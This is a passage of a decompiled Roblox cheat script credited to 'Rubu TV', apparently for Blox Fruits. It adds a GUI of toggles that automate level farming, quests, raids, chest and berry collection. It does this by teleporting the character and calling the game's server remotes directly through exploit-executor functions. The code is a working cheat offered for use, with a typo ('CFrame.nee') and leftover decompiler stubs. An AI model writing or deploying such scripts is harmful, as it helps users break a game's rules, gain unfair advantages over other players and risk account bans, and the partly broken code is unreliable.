    ["Title"] = "Script made by Rubu TV",
    ["Content"] = "Thank for use script"
})
v225:AddButton({
    ["Title"] = "Youtube Channel | @RuBuTV_Roblox",
    ["Description"] = "Click to Copy",
    ["Callback"] = function()
        setclipboard("https://www.youtube.com/@RuBuTV_Roblox/")
    end
})
v225:AddButton({
    ["Title"] = "Server Discord",
    ["Description"] = "Click to Copy",
    ["Callback"] = function()
        setclipboard("https://discord.com/invite/qGYTYuQzd8")
    end
})
local v226 = {
    ["Main"] = v224:AddTab({
        ["Title"] = "Farm Main",
        ["Icon"] = ""
    }),
    ["Settings"] = v224:AddTab({
        ["Title"] = "Config",
        ["Icon"] = ""
    }),
    ["Melee"] = v224:AddTab({
        ["Title"] = "Melee Farm",
        ["Icon"] = ""
    }),
    ["Quests"] = v224:AddTab({
        ["Title"] = "Items Farm",
        ["Icon"] = ""
    }),
    ["SeaEvent"] = v224:AddTab({
        ["Title"] = "Sea Events",
        ["Icon"] = ""
    }),
    ["Mirage"] = v224:AddTab({
        ["Title"] = "Mirage - RaceV4",
        ["Icon"] = ""
    }),
    ["Drago"] = v224:AddTab({
        ["Title"] = "Drago Dojo",
        ["Icon"] = ""
    }),
    ["Prehistoric"] = v224:AddTab({
        ["Title"] = "Prehistoric",
        ["Icon"] = ""
    }),
    ["Raids"] = v224:AddTab({
        ["Title"] = "Raid",
        ["Icon"] = ""
    }),
    ["Combat"] = v224:AddTab({
        ["Title"] = "Combat PVP",
        ["Icon"] = ""
    }),
    ["Travel"] = v224:AddTab({
        ["Title"] = "Teleport",
        ["Icon"] = ""
    }),
    ["Fruit"] = v224:AddTab({
        ["Title"] = "Fruits",
        ["Icon"] = ""
    }),
    ["Shop"] = v224:AddTab({
        ["Title"] = "Shop",
        ["Icon"] = ""
    }),
    ["Misc"] = v224:AddTab({
        ["Title"] = "Misc",
        ["Icon"] = ""
    })
}
pcall(function()
    game.CoreGui.Rubu:Destroy()
end)
local v227 = {
    ["1"] = Instance.new("ScreenGui", game.CoreGui)
}
v227["1"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
v227["1"].Name = "Rubu"
v227["2"] = Instance.new("ImageButton", v227["1"])
v227["2"].BorderSizePixel = 0
v227["2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
v227["2"].Image = "rbxassetid://118855706492329"
v227["2"].Size = UDim2.new(0, 50, 0, 50)
v227["2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
v227["2"].Position = UDim2.new(0.3176, 0, 0.36443, 0)
v227["2"].Draggable = true
v227["2"].MouseButton1Click:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.G, false, game)
end)
v227["3"] = Instance.new("UICorner", v227["2"])
function CheckPC()
    if not game:GetService("UserInputService").TouchEnabled then
        return true
    end
end
IsPc = CheckPC()
executor = tostring(identifyexecutor())
v226.Main:AddToggle("FarmLevel", {
    ["Title"] = "Auto Farm Level",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p228)
    _G.Level = p228
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.Level then
            pcall(function()
				-- upvalues: (ref) vu28
                local v229 = plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text
                if not string.find(v229, QuestNeta()[5]) then
                    replicated.Remotes.CommF_:InvokeServer("AbandonQuest")
                end
                if plr.PlayerGui.Main.Quest.Visible ~= false then
                    if plr.PlayerGui.Main.Quest.Visible == true then
                        if workspace.Enemies:FindFirstChild(QuestNeta()[1]) then
                            local v230, v231, v232 = pairs(workspace.Enemies:GetChildren())
                            while true do
                                local v233
                                v232, v233 = v230(v231, v232)
                                if v232 == nil then
                                    break
                                end
                                if vu28.Alive(v233) and v233.Name == QuestNeta()[1] then
                                    if string.find(v229, QuestNeta()[5]) then
                                        repeat
                                            wait()
                                            vu28.Kill(v233, _G.Level)
                                        until not _G.Level or (v233.Humanoid.Health <= 0 or (not v233.Parent or plr.PlayerGui.Main.Quest.Visible == false))
                                    else
                                        replicated.Remotes.CommF_:InvokeServer("AbandonQuest")
                                    end
                                end
                            end
                        else
                            _tp(QuestNeta()[4])
                            if replicated:FindFirstChild(QuestNeta()[1]) then
                                _tp(replicated:FindFirstChild(QuestNeta()[1]).HumanoidRootPart.CFrame * CFrame.new(0, 30, 0))
                            end
                        end
                    end
                else
                    _tp(QuestNeta()[6])
                    if (Root.Position - QuestNeta()[6].Position).Magnitude <= 5 then
                        replicated.Remotes.CommF_:InvokeServer("StartQuest", QuestNeta()[3], QuestNeta()[2])
                    end
                end
            end)
        end
    end
end)
v226.Main:AddToggle("TravelDress", {
    ["Title"] = "Auto Travel Dressrosa",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p234)
    _G.TravelDres = p234
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.TravelDres and plr.Data.Level.Value >= 700 then
                if workspace.Map.Ice.Door.CanCollide ~= true or workspace.Map.Ice.Door.Transparency ~= 0 then
                    if workspace.Map.Ice.Door.CanCollide ~= false or workspace.Map.Ice.Door.Transparency ~= 1 then
                        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                    elseif Enemies:FindFirstChild("Ice Admiral") then
                        local v235, v236, v237 = pairs(Enemies:GetChildren())
                        while true do
                            local v238
                            v237, v238 = v235(v236, v237)
                            if v237 == nil then
                                break
                            end
                            if v238.Name == "Ice Admiral" and vu28.Alive(v238) then
                                repeat
                                    task.wait()
                                    vu28.Kill(v238, _G.TravelDres)
                                until _G.TravelDres == false or v238.Humanoid.Health <= 0
                                replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                            end
                        end
                    else
                        _tp(CFrame.new(1347.7124, 37.3751602, - 1325.6488))
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Detective")
                    EquipWeapon("Key")
                    repeat
                        wait()
                        _tp(CFrame.new(1347.7124, 37.3751602, - 1325.6488))
                    until not _G.TravelDres or Root.Position == CFrame.new(1347.7124, 37.3751602, - 1325.6488).Position
                end
            end
        end)
    end
end)
v226.Main:AddToggle("Zou", {
    ["Title"] = "Auto Zou Quest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p239)
    _G.AutoZou = p239
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoZou and plr.Data.Level.Value >= 1500 then
                if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 3 then
                    if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 1 then
                            if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 2 then
                                repeat
                                    wait()
                                    _tp(CFrame.new(- 1836, 11, 1714))
                                until not _G.AutoZou or Root.Position == CFrame.new(- 1836, 11, 1714).Position
                                if Root.CFrame == CFrame.new(- 1836, 11, 1714) then
                                    notween(CFrame.new(- 1836, 11, 1714))
                                end
                                notween(CFrame.new(- 1850.49329, 13.1789551, 1750.89685))
                                wait(0.1)
                                notween(CFrame.new(- 1858.87305, 19.3777466, 1712.01807))
                                wait(0.1)
                                notween(CFrame.new(- 1803.94324, 16.5789185, 1750.89685))
                                wait(0.1)
                                notween(CFrame.new(- 1858.55835, 16.8604317, 1724.79541))
                                wait(0.1)
                                notween(CFrame.new(- 1869.54224, 15.987854, 1681.00659))
                                wait(0.1)
                                notween(CFrame.new(- 1800.0979, 16.4978027, 1684.52368))
                                wait(0.1)
                                notween(CFrame.new(- 1819.26343, 14.795166, 1717.90625))
                                wait(0.1)
                                notween(CFrame.new(- 1813.51843, 14.8604736, 1724.79541))
                            end
                        else
                            local v240 = GetConnectionEnemies("Jeremy")
                            if v240 then
                                repeat
                                    wait()
                                    vu28.Kill(v240, _G.AutoZou)
                                until not v240.Parent or (v240.Humanoid.Health <= 0 or _G.AutoZou == false)
                            else
                                _tp(CFrame.new(2099.88159, 448.931, 648.997375))
                            end
                        end
                    elseif string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirates") and (string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and plr.PlayerGui.Main.Quest.Visible == true) then
                        local vu241 = GetConnectionEnemies("Swan Pirate")
                        if vu241 then
                            pcall(function()
								-- upvalues: (ref) vu28, (ref) vu241
                                repeat
                                    wait()
                                    vu28.Kill(vu241, _G.AutoZou)
                                until not vu241.Parent or (vu241.Humanoid.Health <= 0 or (_G.AutoZou == false or plr.PlayerGui.Main.Quest.Visible == false))
                            end)
                        else
                            _tp(CFrame.new(1057.92761, 137.614319, 1242.08069))
                        end
                    else
                        _tp(CFrame.new(- 456.28952, 73.0200958, 299.895966))
                    end
                elseif replicated.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                    if replicated.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                        TabelDevilFruitStore = {}
                        TabelDevilFruitOpen = {}
                        local v242, v243, v244 = pairs(replicated.Remotes.CommF_:InvokeServer("getInventoryFruits"))
                        while true do
                            local v245
                            v244, v245 = v242(v243, v244)
                            if v244 == nil then
                                break
                            end
                            local v246, v247, v248 = pairs(v245)
                            while true do
                                local v249
                                v248, v249 = v246(v247, v248)
                                if v248 == nil then
                                    break
                                end
                                if v248 == "Name" then
                                    table.insert(TabelDevilFruitStore, v249)
                                end
                            end
                        end
                        local v250 = next
                        local v251, v252 = game.ReplicatedStorage:WaitForChild("Remotes").CommF_:InvokeServer("GetFruits")
                        while true do
                            local v253
                            v252, v253 = v250(v251, v252)
                            if v252 == nil then
                                break
                            end
                            if v253.Price >= 1000000 then
                                table.insert(TabelDevilFruitOpen, v253.Name)
                            end
                        end
                        local v254, v255, v256 = pairs(TabelDevilFruitOpen)
                        while true do
                            local v257
                            v256, v257 = v254(v255, v256)
                            if v256 == nil then
                                break
                            end
                            local v258, v259, v260 = pairs(TabelDevilFruitStore)
                            while true do
                                local v261
                                v260, v261 = v258(v259, v260)
                                if v260 == nil then
                                    break
                                end
                                if v257 == v261 and replicated.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                                    if plr.Backpack:FindFirstChild(v261) then
                                        replicated.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "1")
                                        replicated.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "2")
                                        replicated.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "3")
                                    else
                                        replicated.Remotes.CommF_:InvokeServer("F_", "LoadFruit", v261)
                                    end
                                end
                            end
                        end
                        replicated.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "1")
                        replicated.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "2")
                        replicated.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "3")
                    end
                else
                    replicated.Remotes.CommF_:InvokeServer("F_", "TravelZou")
                    if replicated.Remotes.CommF_:InvokeServer("ZQuestProgress", "Check") ~= 0 then
                        if replicated.Remotes.CommF_:InvokeServer("ZQuestProgress", "Check") ~= 1 then
                            local v262 = GetConnectionEnemies("Don Swan")
                            if v262 then
                                repeat
                                    wait()
                                    vu28.Kill(v262, _G.AutoZou)
                                until not _G.AutoZou or (not v262.Parent or v262.Humanoid.Health <= 0)
                            else
                                repeat
                                    wait()
                                    _tp(CFrame.new(2288.802, 15.1870775, 863.034607))
                                until not _G.AutoZou or Root.Position == CFrame.new(2288.802, 15.1870775, 863.034607).Position
                                if Root.CFrame == CFrame.new(2288.802, 15.1870775, 863.034607) then
                                    notween(CFrame.new(2288.802, 15.1870775, 863.034607))
                                end
                            end
                        else
                            replicated.Remotes.CommF_:InvokeServer("F_", "TravelZou")
                        end
                    else
                        local v263 = GetConnectionEnemies("rip_indra")
                        if v263 then
                            repeat
                                wait()
                                vu28.Kill(v263, _G.AutoZou)
                            until not _G.AutoZou or (not v263.Parent or v263.Humanoid.Health <= 0)
                            Check = 2
                            repeat
                                wait()
                                replicated.Remotes.CommF_:InvokeServer("F_", "TravelZou")
                            until Check == 1
                        else
                            replicated.Remotes.CommF_:InvokeServer("F_", "ZQuestProgress", "Check")
                            wait(0.1)
                            replicated.Remotes.CommF_:InvokeServer("F_", "ZQuestProgress", "Begin")
                        end
                    end
                end
            end
        end)
    end
end)
v226.Main:AddSection("Miscellanea / Quest")
v226.Main:AddToggle("ClosetMons", {
    ["Title"] = "Auto Farm Nearest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p264)
    _G.AutoFarmNear = p264
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait() do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoFarmNear then
                local v265, v266, v267 = pairs(workspace.Enemies:GetChildren())
                while true do
                    local v268
                    v267, v268 = v265(v266, v267)
                    if v267 == nil then
                        break
                    end
                    if (v268:FindFirstChild("Humanoid") or v268:FindFirstChild("HumanoidRootPart")) and v268.Humanoid.Health > 0 then
                        repeat
                            wait()
                            vu28.Kill(v268, _G.AutoFarmNear)
                        until not _G.AutoFarmNear or (not v268.Parent or v268.Humanoid.Health <= 0)
                    end
                end
            end
        end)
    end
end)
v226.Main:AddToggle("FactoryRaids", {
    ["Title"] = "Auto Factory Raid",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p269)
    _G.AutoFactory = p269
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.AutoFactory then
                local v270 = GetConnectionEnemies("Core")
                if v270 then
                    repeat
                        wait()
                        EquipWeapon(_G.SelectWeapon)
                        _tp(CFrame.new(448.46756, 199.356781, - 441.389252))
                    until v270.Humanoid.Health <= 0 or _G.AutoFactory == false
                else
                    _tp(CFrame.new(448.46756, 199.356781, - 441.389252))
                end
            end
        end)
    end
end)
v226.Main:AddToggle("CastleRaids", {
    ["Title"] = "Auto Pirate Raid",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p271)
    _G.AutoRaidCastle = p271
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoRaidCastle then
            pcall(function()
				-- upvalues: (ref) vu28
                local v272 = CFrame.new(- 5496.17432, 313.768921, - 2841.53027, 0.924894512, 7.37058015e-9, 0.380223751, 3.5881019e-8, 1, - 1.06665446e-7, - 0.380223751, 1.12297109e-7, 0.924894512)
                if (CFrame.new(- 5539.3115234375, 313.80053710938, - 2972.3723144531).Position - Root.Position).Magnitude > 500 then
                    local v273 = {
                        "Galley Pirate",
                        "Galley Captain",
                        "Raider",
                        "Mercenary",
                        "Vampire",
                        "Zombie",
                        "Snow Trooper",
                        "Winter Warrior",
                        "Lab Subordinate",
                        "Horned Warrior",
                        "Magma Ninja",
                        "Lava Pirate",
                        "Ship Deckhand",
                        "Ship Engineer",
                        "Ship Steward",
                        "Ship Officer",
                        "Arctic Warrior",
                        "Snow Lurker",
                        "Sea Soldier",
                        "Water Fighter"
                    }
                    for v274 = 1, # v273 do
                        if replicated:FindFirstChild(v273[v274]) then
                            local v275, v276, v277 = pairs(replicated:GetChildren())
                            while true do
                                local v278
                                v277, v278 = v275(v276, v277)
                                if v277 == nil then
                                    break
                                end
                                if table.find(v273, v278.Name) then
                                    _tp(v272)
                                end
                            end
                        end
                    end
                else
                    local v279, v280, v281 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v282
                        v281, v282 = v279(v280, v281)
                        if v281 == nil then
                            break
                        end
                        if v282:FindFirstChild("HumanoidRootPart") and (v282:FindFirstChild("Humanoid") and (v282.Humanoid.Health > 0 and (v282.Name and (v282.HumanoidRootPart.Position - Root.Position).Magnitude <= 2000))) then
                            repeat
                                wait()
                                vu28.Kill(v282, _G.AutoRaidCastle)
                            until not _G.AutoRaidCastle or (not v282.Parent or v282.Humanoid.Health <= 0) or not workspace.Enemies:FindFirstChild(v282.Name)
                        end
                    end
                end
            end)
        end
    end
end)
Test = v226.Main:AddDropdown("Test", {
    ["Title"] = "Choose Material",
    ["Values"] = MaterialList,
    ["Multi"] = false,
    ["Default"] = nil
})
Test:OnChanged(function(p283)
    getgenv().SelectMaterial = p283
end)
Toggle = v226.Main:AddToggle("Toggle", {
    ["Title"] = "Auto Materials",
    ["Description"] = "",
    ["Default"] = false
})
Toggle:OnChanged(function(p284)
    getgenv().AutoMaterial = p284
end)
spawn(function()
	-- upvalues: (ref) vu28
    local function vu287(p285, p286)
		-- upvalues: (ref) vu28
        if p285:FindFirstChild("Humanoid") and (p285:FindFirstChild("HumanoidRootPart") and (p285.Humanoid.Health > 0 and p285.Name == p286)) then
            repeat
                wait()
                vu28.Kill(p285, getgenv().AutoMaterial)
            until not getgenv().AutoMaterial or (not p285.Parent or p285.Humanoid.Health <= 0)
        end
    end
    local function vu296()
        local v288, v289, v290 = pairs(game:GetService("Workspace")._WorldOrigin.EnemySpawns:GetChildren())
        while true do
            local v291
            v290, v291 = v288(v289, v290)
            if v290 == nil then
                break
            end
            local v292, v293, v294 = ipairs(MMon)
            while true do
                local v295
                v294, v295 = v292(v293, v294)
                if v294 == nil then
                    break
                end
                if string.find(v291.Name, v295) and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v291.Position).Magnitude >= 10 then
                    _tp(v291.CFrame * Pos)
                end
            end
        end
    end
    while wait() do
        if getgenv().AutoMaterial then
            pcall(function()
				-- upvalues: (ref) vu287, (ref) vu296
                if getgenv().SelectMaterial then
                    MaterialMon(getgenv().SelectMaterial)
                    _tp(MPos)
                end
                local v297, v298, v299 = ipairs(MMon)
                while true do
                    local v300
                    v299, v300 = v297(v298, v299)
                    if v299 == nil then
                        break
                    end
                    local v301, v302, v303 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v304
                        v303, v304 = v301(v302, v303)
                        if v303 == nil then
                            break
                        end
                        vu287(v304, v300)
                    end
                end
                vu296()
            end)
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Farm Ectoplasm",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p305)
    _G.AutoEctoplasm = p305
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoEctoplasm then
                local v306 = GetConnectionEnemies({
                    "Ship Deckhand",
                    "Ship Engineer",
                    "Ship Steward",
                    "Ship Officer",
                    "Arctic Warrior"
                })
                if vu28.Alive(v306) then
                    wait()
                    vu28.Kill(v306, _G.AutoEctoplasm)
                    if not _G.AutoEctoplasm or (not v306.Parent or v306.Humanoid.Health <= 0) then
						-- goto l3
                    end
                end
                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
            end
			-- ::l3::
        end)
    end
end)
v226.Main:AddToggle("Bartilo", {
    ["Title"] = "Auto Done Bartilo Quest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p307)
    _G.Bartilo_Quest = p307
end)
spawn(function()
	-- upvalues: (ref) vu13, (ref) vu28
    while wait(0.1) do
        pcall(function()
			-- upvalues: (ref) vu13, (ref) vu28
            if _G.Bartilo_Quest and Lv >= 850 then
                local v308 = plr.PlayerGui.Main.Quest
                if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 0 then
                    _G.Level = false
                    if v308.Visible ~= true then
                        repeat
                            wait()
                            _tp(CFrame.new(- 461.533203, 72.3478546, 300.311096, 0.050853312, 0, - 0.998706102, 0, 1, 0, 0.998706102, 0, 0.050853312))
                        until (CFrame.new(- 461.533203, 72.3478546, 300.311096, 0.050853312, 0, - 0.998706102, 0, 1, 0, 0.998706102, 0, 0.050853312).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 20 or _G.Bartilo_Quest == false
                        if (CFrame.new(- 461.533203, 72.3478546, 300.311096, 0.050853312, 0, - 0.998706102, 0, 1, 0, 0.998706102, 0, 0.050853312).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 1 then
                            replicated.Remotes.CommF_:InvokeServer("StartQuest", "BartiloQuest", 1)
                        end
                    else
                        if GetConnectionEnemies("Swan Pirate") then
                            local v309 = GetConnectionEnemies(vu13)
                            if not v309 then
								-- goto l3
                            end
                            task.wait()
                            if string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirate") then
                                vu28.Kill(v309, _G.Bartilo_Quest)
                            else
                                replicated.Remotes.CommF_:InvokeServer("AbandonQuest")
                            end
                            if _G.Bartilo_Quest == false or (not v309.Parent or (v309.Humanoid.Health <= 0 or (v308.Visible == false or not v309:FindFirstChild("HumanoidRootPart")))) then
								-- goto l3
                            end
                        end
                        _tp(CFrame.nee(970.369446, 142.653198, 1217.3667, 0.162079468, - 4.85452638e-8, - 0.986777723, 1.03357589e-8, 1, - 4.74980872e-8, 0.986777723, - 2.50063148e-9, 0.162079468))
                    end
					-- goto l3
                end
                if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 1 then
                    if replicated.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 2 then
                        repeat
                            wait()
                            _tp(CFrame.new(- 1830.83972, 10.5578213, 1680.60229, 0.979988456, - 2.02152783e-8, - 0.199054286, 2.20792113e-8, 1, 7.1442483e-9, 0.199054286, - 1.13962431e-8, 0.979988456))
                        until (CFrame.new(- 1830.83972, 10.5578213, 1680.60229, 0.979988456, - 2.02152783e-8, - 0.199054286, 2.20792113e-8, 1, 7.1442483e-9, 0.199054286, - 1.13962431e-8, 0.979988456).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 1 or _G.Bartilo_Quest == false
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate1.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate2.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate3.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate4.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate5.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate6.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate7.CFrame
                        wait(0.5)
                        plr.Character.HumanoidRootPart.CFrame = workspace.Map.Dressrosa.BartiloPlates.Plate8.CFrame
                        wait(2.5)
                    end
                else
                    _G.Level = false
                    local v310 = GetConnectionEnemies("Jeremy")
                    if v310 then
                        task.wait()
                        vu28.Kill(v310, _G.Bartilo_Quest)
                        if _G.Bartilo_Quest == false or (not v310.Parent or (v310.Humanoid.Health <= 0 or (v308.Visible == false or not v310:FindFirstChild("HumanoidRootPart")))) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(2158.97412, 449.056244, 705.411682, - 0.754199564, - 4.17389057e-9, - 0.656645238, - 4.47752875e-8, 1, 4.50709301e-8, 0.656645238, 6.3393955e-8, - 0.754199564))
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Main:AddToggle("CitizenQ", {
    ["Title"] = "Auto Done Citizen Quest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p311)
    _G.CitizenQuest = p311
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.CitizenQuest then
                if Lv < 1800 or replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress").KilledBandits ~= false then
                    if Lv < 1800 or replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress").KilledBoss ~= false then
                        if Lv >= 1800 and replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen") == 2 then
                            _tp(CFrame.new(- 12512.138671875, 340.39279174805, - 9872.8203125))
                        end
                    else
                        local v312 = GetConnectionEnemies("Captain Elephant")
                        if plr.PlayerGui.Main.Quest.Visible and (string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") and plr.PlayerGui.Main.Quest.Visible == true) then
                            if v312 then
                                repeat
                                    task.wait()
                                    vu28.Kill(v312, _G.CitizenQuest)
                                until _G.CitizenQuest == false or (v312.Humanoid.Health <= 0 or (not v312.Parent or plr.PlayerGui.Main.Quest.Visible == false))
                            else
                                _tp(CFrame.new(- 13374.889648438, 421.27752685547, - 8225.208984375))
                            end
                        else
                            _tp(CFrame.new(- 12443.8671875, 332.40396118164, - 7675.4892578125))
                            if (CFrame.new(- 12443.8671875, 332.40396118164, - 7675.4892578125).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 4 then
                                wait(1.5)
                                replicated.Remotes.CommF_:InvokeServer("CitizenQuestProgress", "Citizen")
                            end
                        end
                    end
                elseif string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Forest Pirate") and (string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and plr.PlayerGui.Main.Quest.Visible == true) then
                    local v313 = GetConnectionEnemies("Forest Pirate")
                    if v313 then
                        task.wait()
                        vu28.Kill(v313, _G.CitizenQuest)
                        if _G.CitizenQuest == false or (not v313.Parent or (v313.Humanoid.Health <= 0 or plr.PlayerGui.Main.Quest.Visible == false)) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(- 13206.452148438, 425.89199829102, - 7964.5537109375))
                else
                    _tp(CFrame.new(- 12443.8671875, 332.40396118164, - 7675.4892578125))
                    if (Vector3.new(- 12443.8671875, 332.40396118164, - 7675.4892578125) - plr.Character.HumanoidRootPart.Position).Magnitude <= 30 then
                        wait(1.5)
                        replicated.Remotes.CommF_:InvokeServer("StartQuest", "CitizenQuest", 1)
                    end
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Training Dummy",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p314)
    _G.DummyMan = p314
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.DummyMan then
            pcall(function()
				-- upvalues: (ref) vu28
                if plr.PlayerGui.Main.Quest.Visible ~= false then
                    local v315 = GetConnectionEnemies("Training Dummy")
                    if v315 then
                        repeat
                            wait()
                            vu28.Kill(v315, _G.DummyMan)
                        until not _G.DummyMan or (not v315.Parent or v315.Humanoid.Health <= 0)
                    else
                        _tp(CFrame.new(3688.0051269531, 12.746943473816, 170.20953369141))
                    end
                else
                    replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack({
                        "ArenaTrainer"
                    }))
                end
            end)
        end
    end
end)
v226.Main:AddToggle("Berry", {
    ["Title"] = "Auto Collect Berry",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p316)
    _G.AutoBerry = p316
end)
spawn(function()
    while wait(Sec) do
        if _G.AutoBerry then
            local v317 = game:GetService("CollectionService")
            local _ = game:GetService("Players").LocalPlayer
            local v318 = v317:GetTagged("BerryBush")
            local _ = math.huge
            for v319 = 1, # v318 do
                local v320 = v318[v319]
                local v321, v322, v323 = pairs(v320:GetAttributes())
                while true do
                    local v324
                    v323, v324 = v321(v322, v323)
                    if v323 == nil then
                        break
                    end
                    if not BerryArray or table.find(BerryArray, v324) then
                        _tp(v320.Parent:GetPivot())
                        for v325 = 1, # v318 do
                            local v326 = v318[v325]
                            local v327, v328, v329 = pairs(v326:GetChildren())
                            while true do
                                local v330
                                v329, v330 = v327(v328, v329)
                                if v329 == nil then
                                    break
                                end
                                if not BerryArray or table.find(BerryArray, v330) then
                                    _tp(v330.WorldPivot)
                                    fireproximityprompt(v330.ProximityPrompt, math.huge)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end)
v226.Main:AddToggle("Chest", {
    ["Title"] = "Auto Collect Chest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p331)
    _G.AutoFarmChest = p331
end)
spawn(function()
    while wait(Sec) do
        if _G.AutoFarmChest then
            pcall(function()
                local v332 = game:GetService("CollectionService")
                local v333 = game:GetService("Players").LocalPlayer
                local v334 = v333.Character or v333.CharacterAdded:Wait()
                if v334 then
                    local v335 = v334:GetPivot().Position
                    local v336 = v332:GetTagged("_ChestTagged")
                    local v337 = math.huge
                    local v338 = nil
                    for v339 = 1, # v336 do
                        local v340 = v336[v339]
                        local v341 = (v340:GetPivot().Position - v335).Magnitude
                        if not SelectedIsland or v340:IsDescendantOf(SelectedIsland) then
                            if not v340:GetAttribute("IsDisabled") then
                                if v341 < v337 then
                                    v338 = v340
                                    v337 = v341
                                end
                            end
                        end
                    end
                    if v338 then
                        _tp(v338:GetPivot())
                    end
                end
            end)
        end
    end
end)
v226.Main:AddSection("Miscellanea / Mastery")
v226.Main:AddDropdown("Mastery_Config", {
    ["Title"] = "Choose Island",
    ["Values"] = {
        "Cake",
        "Bone"
    },
    ["Multi"] = false,
    ["Default"] = 1
}):OnChanged(function(p342)
    SelectIsland = p342
end)
v226.Main:AddToggle("MasteryFruits", {
    ["Title"] = "Auto Mastery Fruits",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p343)
    _G.FarmMastery_Dev = p343
end)
spawn(function()
    RunSer.RenderStepped:Connect(function()
        pcall(function()
            if _G.FarmMastery_Dev or (_G.FarmMastery_G or _G.FarmMastery_S) then
